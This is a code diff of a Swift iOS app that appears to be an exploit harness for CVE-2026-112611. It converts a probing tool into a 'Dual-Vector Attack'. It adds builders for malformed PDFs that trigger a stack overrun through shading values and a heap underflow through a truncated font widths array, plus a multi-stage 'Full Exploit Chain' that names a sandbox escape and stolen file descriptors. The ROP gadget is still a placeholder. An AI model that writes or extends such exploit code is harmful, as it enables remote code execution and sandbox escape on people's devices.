@@ -13,54 +13,51 @@ func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ valu
 func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
 func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }
 
-// MARK: - Data-Only Attack Probe (Single Test)
+// MARK: - CVE-2026-112611: Dual-Vector Attack
 
-/// Run a specific test by number
-func runTest(_ testNumber: Int) {
-    print("[*] Running Test \(testNumber)...")
-    
-    switch testNumber {
-    case 1:
-        print("[*] Test 1: Null pointer (0x0)")
-        testValueAtOffset(value: 0x0000000000000000)
-    case 2:
-        print("[*] Test 2: Small integer (0x1000)")
-        testValueAtOffset(value: 0x0000000000001000)
-    case 3:
-        print("[*] Test 3: Stack address (0x160000000)")
-        testValueAtOffset(value: 0x0000000160000000)
-    case 4:
-        print("[*] Test 4: Heap address (0x100000000)")
-        testValueAtOffset(value: 0x0000000100000000)
-    case 5:
-        print("[*] Test 5: Kernel address (0xfffffe0000000000)")
-        testValueAtOffset(value: 0xfffffe0000000000)
-    default:
-        print("[!] Invalid test number: \(testNumber)")
-    }
-}
-
-/// Test specific value at buffer + 0x1c
-func testValueAtOffset(value: UInt64) {
+/// Vector 1: Type-5 shading stack VLA overrun
+func triggerShadingVector(controlledValue: UInt64) {
     var values = [Double](repeating: 0.0, count: 136)
-    
-    // Place value at index 3-4 (offset 0x1c = 28 bytes = index 3.5)
-    let valueDouble = Double(bitPattern: value)
-    values[3] = valueDouble
-    values[4] = valueDouble
+    values[3] = Double(bitPattern: controlledValue)
+    values[4] = Double(bitPattern: controlledValue)
     
     let pdfData = PDFPayload.shadingWithValues(values)
     renderPDF(pdfData)
 }
 
-// MARK: - Full Exploit (after finding primitive)
+/// Vector 2: Font widths heap underflow
+func triggerFontVector(widthsCount: Int) {
+    let pdfData = PDFPayload.fontWithShortWidths(widthsCount: widthsCount)
+    renderPDF(pdfData)
+}
+
+// MARK: - Test Runner
+
+func runTest(vector: String, param: Int) {
+    print("[*] Running \(vector) with param \(param)...")
+    
+    switch vector {
+    case "shading":
+        triggerShadingVector(controlledValue: UInt64(param))
+    case "font":
+        triggerFontVector(widthsCount: param)
+    default:
+        print("[!] Unknown vector: \(vector)")
+    }
+}
+
+// MARK: - Full Exploit Chain
 
 func runFullExploit() {
-    print("[*] Stage 1: Triggering WebContent RCE via CVE-2026-112611...")
+    print("[*] Stage 1: Triggering CVE-2026-112611...")
     
-    // Based on probe results, use the working primitive
-    let gadgetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real ROP gadget
-    testValueAtOffset(value: gadgetAddress)
+    // Try font vector first (heap control may be better)
+    print("[*] Trying font vector with widths=3...")
+    triggerFontVector(widthsCount: 3)
+    
+    // Fallback to shading vector
+    print("[*] Trying shading vector...")
+    triggerShadingVector(controlledValue: 0x4141414141414141)
     
     print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
     
@@ -115,7 +112,7 @@ func readWithStolenFD(fd: Int32, length: Int) -> Data? {
 
 func renderPDF(_ data: Data) {
     let tempURL = FileManager.default.temporaryDirectory
-        .appendingPathComponent("probe.pdf")
+        .appendingPathComponent("exploit.pdf")
     
     try? data.write(to: tempURL)
     
@@ -145,29 +142,38 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var selectedTest = 1
-    @State private var status = "Ready to probe"
+    @State private var selectedVector = "font"
+    @State private var param = 3
     @State private var isRunning = false
     @State private var logOutput = ""
     
+    let vectors = ["shading", "font"]
+    
     var body: some View {
         VStack(spacing: 20) {
-            Text("CVE-2026-112611 Probe")
+            Text("CVE-2026-112611 Dual-Vector")
                 .font(.largeTitle)
                 .bold()
             
-            Text("Data-Only Attack: Control buffer+0x1c")
+            Text("Shading + Font Attacks")
                 .font(.headline)
             
-            // Test selector
-            Picker("Test", selection: $selectedTest) {
-                Text("T1: Null").tag(1)
-                Text("T2: 0x1000").tag(2)
-                Text("T3: Stack").tag(3)
-                Text("T4: Heap").tag(4)
-                Text("T5: Kernel").tag(5)
+            // Vector selector
+            Picker("Vector", selection: $selectedVector) {
+                ForEach(vectors, id: \.self) { vector in
+                    Text(vector.capitalized).tag(vector)
+                }
             }
             .pickerStyle(SegmentedPickerStyle())
+            .padding(.horizontal)
+            
+            // Parameter
+            HStack {
+                Text("Param:")
+                TextField("Value", value: $param, format: .number)
+                    .textFieldStyle(RoundedBorderTextFieldStyle())
+                    .keyboardType(.numberPad)
+            }
             .padding(.horizontal)
             
             ScrollView {
@@ -181,8 +187,8 @@ struct ContentView: View {
             .cornerRadius(10)
             
             HStack(spacing: 20) {
-                Button(action: runSelectedTest) {
-                    Text(isRunning ? "Running..." : "Run Test \(selectedTest)")
+                Button(action: runTest) {
+                    Text(isRunning ? "Running..." : "Run Test")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -206,14 +212,12 @@ struct ContentView: View {
         .padding()
     }
     
-    func runSelectedTest() {
+    func runTest() {
         isRunning = true
-        logOutput = "[*] Starting Test \(selectedTest)...\n"
-        logOutput += "[*] Value will be placed at buffer+0x1c\n"
-        logOutput += "[*] Check crash log for 'far' address\n"
+        logOutput = "[*] Starting \(selectedVector) test with param \(param)...\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            runTest(selectedTest)
+            runTest(vector: selectedVector, param: param)
             
             DispatchQueue.main.async {
                 logOutput += "[*] Test complete (or crashed)\n"
@@ -240,6 +244,7 @@ struct ContentView: View {
 // MARK: - PDF Payload Builder
 
 enum PDFPayload {
+    /// Vector 1: Type-5 shading with controlled values
     static func shadingWithValues(_ values: [Double]) -> Data {
         let bpCoord = 32
         let bpComp = 8
@@ -273,6 +278,31 @@ enum PDFPayload {
         pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
         
         return pdf.data()
+    }
+    
+    /// Vector 2: Font with short widths array
+    static func fontWithShortWidths(widthsCount: Int) -> Data {
+        var pdf = ""
+        pdf += "%PDF-1.7\n"
+        pdf += "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
+        pdf += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
+        pdf += "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>\nendobj\n"
+        
+        // Malicious font: widths array too short
+        var widths = "["
+        for i in 0..<widthsCount {
+            widths += "\(i + 1)"
+            if i < widthsCount - 1 { widths += " " }
+        }
+        widths += "]"
+        
+        pdf += "4 0 obj\n<< /Type /Font /Subtype /TrueType /BaseFont /Helvetica /FirstChar 0 /LastChar 255 /Widths \(widths) /Range [0 1 0 1] >>\nendobj\n"
+        
+        let stream = "q 0 0 612 792 re W n /Range [0 1 0 1] BT /F1 12 Tf (AAAA) Tj ET Q"
+        pdf += "5 0 obj\n<< /Length \(stream.count) >>\nstream\n\(stream)\nendstream\nendobj\n"
+        pdf += "trailer\n<< /Root 1 0 R >>\n%%EOF\n"
+        
+        return pdf.data(using: .utf8)!
     }
 }
 
